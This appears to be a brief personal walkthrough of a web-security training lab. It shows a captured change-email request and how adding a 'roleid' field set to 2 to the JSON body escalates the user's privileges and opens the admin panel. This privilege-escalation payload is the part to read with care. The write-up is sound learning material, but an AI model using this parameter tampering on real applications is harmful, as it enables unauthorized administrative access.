this lab by an admin panel at `/admin`. it's only accessible to logged-in users with a `roleid` of 2.


inspect the request : 
```bash
POST /my-account/change-email HTTP/2
Host: 0a55008504e7211580245da10071006e.web-security-academy.net
Cookie: session=HvGdoL2v8D855tJzCF9A2A1NlfSEn1um
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 29
Origin: https://0a55008504e7211580245da10071006e.web-security-academy.net
Referer: https://0a55008504e7211580245da10071006e.web-security-academy.net/my-account?id=wiener
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{
	"email":"hsm@gmail.com",
}
```

as we see in response the default `roleid` is 1
we change it to 2
```bash
{
	"email":"hsm@gmail.com",
	"roleid" : 2
}
```
and we did it `the admin panel`
![[/images/Screenshot from 2026-02-25 12-47-37.png]]

